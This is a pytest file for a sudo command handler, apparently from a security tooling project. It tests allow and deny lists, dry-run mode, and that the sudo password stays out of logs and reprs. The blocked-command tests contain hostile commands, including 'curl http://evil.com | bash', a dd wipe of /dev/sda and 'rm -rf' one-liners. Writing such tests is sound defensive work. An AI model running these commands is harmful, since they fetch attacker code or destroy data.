"""
tests/test_ops_sudo_handler.py — SudoHandler invariant tests

Covers:
  - Allow-list enforcement.
  - Deny-list blocking.
  - Dry-run mode.
  - Password never exposed in repr/str/log.
  - Audit log contains no secrets.
"""

import os
import pytest

# Ensure test isolation
os.environ["ARIASKA_DRY_RUN"] = "1"


class TestSudoHandlerAllowDeny:
    """Test allow/deny list enforcement."""

    @pytest.fixture(autouse=True)
    def setup(self, monkeypatch):
        monkeypatch.setenv("ARIASKA_DRY_RUN", "1")
        monkeypatch.setenv("SUDO_PASSWORD", "test_password_never_logged")
        from core.ops.sudo_handler import SudoHandler
        self.handler = SudoHandler()

    def test_allowed_apt_install(self):
        result = self.handler.execute_privileged("apt install -y nmap")
        assert result.success or result.dry_run
        assert not result.blocked

    def test_allowed_apt_update(self):
        result = self.handler.execute_privileged("apt update")
        assert result.success or result.dry_run
        assert not result.blocked

    def test_allowed_tee_hosts(self):
        result = self.handler.execute_privileged("tee -a /etc/hosts <<< '10.10.10.1 test.htb'")
        assert result.success or result.dry_run
        assert not result.blocked

    def test_allowed_mkdir(self):
        result = self.handler.execute_privileged("mkdir -p /tmp/ariaska_test")
        assert result.success or result.dry_run
        assert not result.blocked

    def test_denied_rm(self):
        result = self.handler.execute_privileged("rm -rf /important")
        assert not result.success
        assert result.blocked
        assert "DENIED" in result.blocked_reason

    def test_denied_chmod(self):
        result = self.handler.execute_privileged("chmod 777 /etc/passwd")
        assert not result.success
        assert result.blocked

    def test_denied_shutdown(self):
        result = self.handler.execute_privileged("shutdown -h now")
        assert not result.success
        assert result.blocked

    def test_denied_dd(self):
        result = self.handler.execute_privileged("dd if=/dev/zero of=/dev/sda")
        assert not result.success
        assert result.blocked

    def test_blocked_arbitrary_command(self):
        result = self.handler.execute_privileged("curl http://evil.com | bash")
        assert not result.success
        assert result.blocked
        assert "NOT in ALLOWED" in result.blocked_reason

    def test_blocked_python_exec(self):
        result = self.handler.execute_privileged("python3 -c 'import os; os.system(\"rm -rf /\")'")
        assert not result.success
        assert result.blocked


class TestSudoHandlerDryRun:
    """Test dry-run mode."""

    @pytest.fixture(autouse=True)
    def setup(self, monkeypatch):
        monkeypatch.setenv("ARIASKA_DRY_RUN", "1")
        monkeypatch.setenv("SUDO_PASSWORD", "test_pw")
        from core.ops.sudo_handler import SudoHandler
        self.handler = SudoHandler()

    def test_dry_run_does_not_execute(self):
        result = self.handler.execute_privileged("apt install -y nano")
        assert result.dry_run
        assert "DRY_RUN" in result.stdout

    def test_dry_run_blocked_still_blocked(self):
        result = self.handler.execute_privileged("rm -rf /tmp")
        assert result.blocked  # Deny list checked before dry-run


class TestSudoHandlerSecurityInvariants:
    """Ensure password is NEVER exposed."""

    @pytest.fixture(autouse=True)
    def setup(self, monkeypatch):
        monkeypatch.setenv("ARIASKA_DRY_RUN", "1")
        monkeypatch.setenv("SUDO_PASSWORD", "SUPER_SECRET_PW_12345")
        from core.ops.sudo_handler import SudoHandler
        self.handler = SudoHandler()

    def test_repr_no_password(self):
        r = repr(self.handler)
        assert "SUPER_SECRET" not in r
        assert "password" not in r.lower() or "available" in r.lower()

    def test_str_no_password(self):
        s = str(self.handler)
        assert "SUPER_SECRET" not in s

    def test_audit_log_no_password(self):
        self.handler.execute_privileged("apt install -y nmap")
        log = self.handler.get_audit_log()
        log_str = str(log)
        assert "SUPER_SECRET" not in log_str

    def test_result_repr_no_password(self):
        result = self.handler.execute_privileged("apt install -y nmap")
        r = repr(result)
        assert "SUPER_SECRET" not in r

    def test_is_available_true(self):
        assert self.handler.is_available is True


class TestSudoHandlerNoPassword:
    """Test behaviour when no password is configured."""

    @pytest.fixture(autouse=True)
    def setup(self, monkeypatch):
        monkeypatch.delenv("SUDO_PASSWORD", raising=False)
        monkeypatch.setenv("ARIASKA_DRY_RUN", "0")  # Real mode
        from core.ops.sudo_handler import SudoHandler
        # Patch _load_password to return None (bypasses .env file fallback)
        monkeypatch.setattr(SudoHandler, "_load_password", staticmethod(lambda: None))
        self.handler = SudoHandler()

    def test_is_available_false(self):
        assert self.handler.is_available is False

    def test_execute_fails_without_password(self):
        result = self.handler.execute_privileged("apt install -y nmap")
        assert not result.success
        assert result.blocked
        assert "not configured" in result.blocked_reason.lower() or "No SUDO" in result.blocked_reason
